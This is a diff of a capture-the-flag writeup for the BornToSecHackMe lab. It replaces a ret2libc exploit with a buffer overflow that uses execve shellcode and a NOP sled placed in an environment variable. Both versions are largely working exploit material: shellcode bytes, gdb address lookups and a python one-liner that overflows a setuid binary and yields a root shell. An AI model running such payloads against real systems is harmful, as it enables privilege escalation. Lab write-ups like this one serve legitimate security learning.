@@ -1,68 +1,58 @@
-# Writeup 4 - Ret2LibC
+# Writeup 4 - Buffer Overflow + Shellcode Exploitation
 
 ## Writeups Map
 
-![Imgur](https://i.imgur.com/io1rZpf.png)
+![Imgur](https://i.imgur.com/gb4HAhr.png)
 
 ## Summary
 
-- [14.4 Ret2LibC](#144-ret2libc)
+- [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)
 
 ## Exploitation
 
-### 14.4 Ret2LibC
+### 14.3 Buffer overflow the setuid binary
 
-> All the following steps can lead here:
->
-> - [12. Getting SSH access as zaz](./Writeup1.md#12-getting-ssh-access-as-zaz)
+We can exploit the EIP overflow by using a shellcode. We can export the shellcode in an environment variable, get its address and pass it to EIP to execute the shellcode.
 
-Here we'll use the ret-to-libc technique to change the binary's execution flow by re-using existing executable code from the C standard library shared object that is already loaded and mapped into the program's virtual memory space. The return address will be overwritten with a memory address that points to the system() libc function, and we'll pass /bin/sh as the argument in order to spawn a shell. 
-
-We need to find the addresses of system(), exit() and /bin/sh :
+We'll be using this shellcode that will call execve using a syscall :
 
 ```text
-(gdb) p system
-$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
-(gdb) p exit
-$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
-(gdb) info proc map
-process 2160
-Mapped address spaces:
-
-Start Addr   End Addr       Size     Offset objfile
- 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
- 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
-0xb7e2b000 0xb7e2c000     0x1000        0x0 
-0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-0xb7fd2000 0xb7fd5000     0x3000        0x0 
-0xb7fda000 0xb7fdd000     0x3000        0x0 
-0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
-0xb7f8cc58
-1 pattern found.
+\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
 
-We've got all that we need. We can now craft our payload. Here's the general look:
+[more info here](https://github.com/SERAC-SGM/rainfall-42/tree/main/level02)
 
-payload = padding + address of system() + return address of system() + address of "/bin/sh"
-
-In our case, we'll have (addresses in little-endian architecture):
+We export it with a NOP sled in case it's more reliable:
 
 ```text
-"A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
 
-Let's run it :
+Next, we locate the address of the environment variable using gdb:
 
 ```text
-zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")')
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
+(gdb) x/500s environ
+0xbffff77c: "\245\370\377\277\265\370\377\277\311\370\377\277\352\370\377\277\375\370\377\277\201\371\377\277\212\371\377\277\253\376\377\277\267\376\377\277\004\377\377\277\027\377\377\277&\377\377\277\064\377\377\277E\377\377\277N\377\377\277]\377\377\277e\377\377\277q\377\377\277\245\377\377\277\305\377\377\277"
+0xbffff7cd: ""
+0xbffff7ce: ""
+0xbffff7cf: ""
+0xbffff7d0: " "
+0xbffff7d2: ""
+[...]
+0xbffff8ea: "SSH_TTY=/dev/pts/0"
+0xbffff8fd: "P=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
+0xbffff981: "USER=zaz"
+[...]
+
+(gdb) x/s 0xbffff8ff
+0xbffff8ff: "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Rhn/shh//bi\211\343RS\211\341\260\v̀"
+```
+
+One we have this address, we can send it to the binary with the 140 characters of padding before it (address in little endian):
+
+```text
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print("A" * 140 + "\xff\xf8\xff\xbf")')
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
 # whoami
 root
 ```
